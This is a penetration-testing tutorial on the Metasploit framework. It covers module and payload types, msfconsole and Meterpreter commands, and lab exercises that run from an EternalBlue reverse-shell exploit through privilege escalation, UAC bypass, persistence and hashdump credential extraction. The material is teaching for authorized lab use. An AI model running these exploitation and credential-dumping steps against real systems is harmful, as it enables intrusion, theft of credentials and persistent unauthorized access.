Introduction

Metasploit is the world's most-used penetration testing framework, developed by Rapid7. It contains hundreds of pre-built exploits, payloads, and post-exploitation modules, making it the standard tool for offensive security professionals.

Metasploit is used for:

  • Exploit Development: Research and development of new exploitation techniques
  • Penetration Testing: Real-world security assessments with client authorization
  • Vulnerability Verification: Confirming whether systems are actually vulnerable
  • Payload Delivery: Generating shells and backdoors across multiple platforms
  • Post-Exploitation: Maintaining access and escalating privileges

⚠️ Critical Legal Warning

Using Metasploit or any exploitation tool against systems without explicit written authorization is illegal in virtually all jurisdictions. This activity uses ONLY isolated lab environments with your express permission. Unauthorized use violates the Computer Fraud and Abuse Act (CFAA) and can result in criminal charges.

Metasploit Framework Architecture

Core Components

Metasploit is organized into several key components:

1

Modules

Pre-built exploits, payloads, and post-exploitation code

2

Payloads

Code executed on compromised targets (shells, stagers)

3

Encoders

Obfuscate payloads to evade detection

4

Handlers

Receive and manage sessions from exploited targets

Module Types

Module Type Purpose Example
Exploit Attacks that take advantage of a vulnerability exploit/windows/smb/ms17_010_eternalblue
Payload Code that runs on the target after exploitation payload/windows/meterpreter/reverse_tcp
Encoder Obfuscates payloads to avoid detection encoder/x86/shikata_ga_nai
Auxiliary Scanning, fuzzing, and information gathering auxiliary/scanner/smb/smb_version
Post Post-exploitation modules for maintaining access post/windows/escalate/bypassuac

Understanding Payloads

Payload Categories

Metasploit offers different payload types for different scenarios:

🔄

Stagers

Small code that downloads and executes the main payload

🎯

Stages

Full-featured payloads (shells, Meterpreter)

⚙️

Singles

Standalone payloads (no staging)

📡

Reverse Shells

Target connects back to attacker

🖥️

Bind Shells

Target opens port for attacker to connect to

🛡️

Meterpreter

Advanced shell with post-exploitation tools

Common Payload Architectures

  • windows/meterpreter/reverse_tcp: Windows target, reverse connection, Meterpreter shell
  • windows/meterpreter/bind_tcp: Windows target, bind connection, Meterpreter shell
  • linux/x86/meterpreter/reverse_tcp: 32-bit Linux target, reverse connection
  • linux/x64/meterpreter/reverse_tcp: 64-bit Linux target, reverse connection
  • android/meterpreter/reverse_tcp: Android target with mobile-specific capabilities

Basic Metasploit Commands

# Launch msfconsole
msfconsole

# Search for exploits
search windows smb
search type:exploit platform:windows

# Select an exploit
use exploit/windows/smb/ms17_010_eternalblue

# View module information
info
options

# Set options
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp

# Run the exploit
exploit
exploit -j # Run in background (job)

# Session management
sessions -l # List active sessions
sessions -i 1 # Interact with session 1
background # Background current session

💡 Pro Tips

  • Always use "show options" before running exploits to understand what's required
  • Test payload generation first with "generate -t exe -f myshell.exe"
  • Use background to run multiple exploits concurrently
  • Leverage Meterpreter's post-exploitation modules for privilege escalation
  • Create resource scripts to automate common workflows

Meterpreter Post-Exploitation

Essential Meterpreter Commands

# Information gathering
sysinfo # System information
getuid # Current user
pwd # Current directory

# File system operations
ls # List directory
cat C:\Windows\System32\drivers\etc\hosts
upload /local/file C:\remote\path
download C:\remote\file /local/path

# Process management
ps # List running processes
kill 1234 # Kill process by PID
migrate 1234 # Migrate to another process

# Privilege escalation
getsystem # Attempt to escalate to SYSTEM
run post/windows/escalate/bypassuac

# Network commands
ifconfig # Network configuration
route print # Routing table
arp # ARP table

# Persistence
run persistence -X # Install persistence
run scheduleme -m 5 # Scheduled task

Hands-On Exercises

Exercise 1: Metasploit Environment Setup

Objective: Install and configure Metasploit Framework.

  1. Install Metasploit:
    • Linux: sudo apt-get install metasploit-framework
    • Or download from: https://www.metasploit.com/download
  2. Start PostgreSQL database: sudo systemctl start postgresql
  3. Initialize MSF database: msfdb init
  4. Launch msfconsole: msfconsole
  5. Verify installation: db_status

Exercise 2: Module Discovery and Selection

Objective: Search for and select appropriate exploits.

  1. Launch msfconsole
  2. Search for Windows SMB exploits: search type:exploit platform:windows smb
  3. Search for EternalBlue (MS17-010): search ms17_010
  4. Select the exploit: use exploit/windows/smb/ms17_010_eternalblue
  5. View module details: info
  6. Document:
    • Module path and author
    • Description and vulnerability details
    • Required options (RHOST, PAYLOAD)
    • Supported platforms and architectures

Exercise 3: Payload Generation and Configuration

Objective: Generate and configure exploitation payloads.

  1. Select an exploit from Exercise 2
  2. Set options:
    • set RHOST 192.168.100.50 (lab target)
    • set LHOST 192.168.100.100 (your machine)
    • set LPORT 4444
    • set PAYLOAD windows/meterpreter/reverse_tcp
  3. Review configuration: show options
  4. Generate standalone payload: generate -t exe -f myshell.exe
  5. Document payload characteristics and size

Exercise 4: Exploitation and Session Management

Objective: Execute exploits and manage successful sessions.

  1. From Exercise 3 configuration, launch exploit: exploit
  2. Wait for successful exploitation (check for session)
  3. If successful:
    • Run: sessions -l to list sessions
    • Run: sessions -i 1 to interact with session
    • Verify access: sysinfo and getuid
  4. Document exploitation results and access level

Exercise 5: Post-Exploitation Techniques

Objective: Use Meterpreter for post-exploitation activities.

  1. From active Meterpreter session, gather information:
    • sysinfo - System details
    • getuid - Current user
    • ps - Running processes
    • ipconfig - Network configuration
  2. Attempt privilege escalation: getsystem
  3. If escalation succeeds, document new privileges
  4. Use post-exploitation modules:
    • run post/windows/gather/hashdump (extract hashes)
    • run post/windows/escalate/bypassuac (UAC bypass)
  5. Document all findings and access changes
